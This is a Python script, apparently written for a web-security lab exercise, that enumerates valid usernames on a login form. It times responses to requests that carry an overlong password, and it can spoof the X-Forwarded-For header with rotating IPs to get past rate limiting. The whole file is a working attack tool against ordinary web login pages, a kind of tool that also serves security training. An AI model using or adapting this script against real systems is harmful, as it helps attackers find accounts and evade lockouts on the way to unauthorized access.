import requests
import re

lab_value=" "
sessionValue=" "
host=" "
csrftoken=" " 
usernamelist=""
time_limit=1

def guess_login(login,supportXforward=False,nr=1):
    #cookie={'session':sessionValue}
    cookie={'_lab':lab_value,'session':sessionValue}
    #payload = {'username':login,'password':'peterpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp'}
    payload = {'csrf':csrftoken,'username':login,'password':'peterpppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp'}
    hed={'X-Forwarded-For':'192.168.53.'+str(nr)}
    try:
        if supportXforward:
            response = requests.post(host ,data=payload,headers=hed)
        else:
            response = requests.post(host ,data=payload)
    except Exception as e:
        print(e)
    res_time = response.elapsed.total_seconds()
    return res_time

def open_list_file(filepath):
    file=open(filepath,'r')
    lists=file.readlines()
    words=[]
    for i in range(len(lists)):
        words.append(lists[i].rstrip('\n').split(',')[0])        
    return words

def bruteforce(supportXforward=False):
    response_len=guess_login("napewnozlylogin",supportXforward,244)
    tryNr=1
    for word in usernamelist:
        tryNr+=1
        new_len=abs(response_len-guess_login(word,supportXforward,tryNr))
        print("try nr: "+str(tryNr)+" and response time: "+str(new_len))
        if new_len>time_limit:
            print("valid login can be: "+word)
            break

    

try:
    filepath=input("Enter a filepath to username list: ")
    usernamelist=open_list_file(filepath)
except Exception as e:
        print(e)

supportXforward=int(input("Do web support-X-forward[1/0]: "))

if supportXforward==1:
    supportXforward=True
else:
    supportXforward=False


bruteforce(supportXforward)
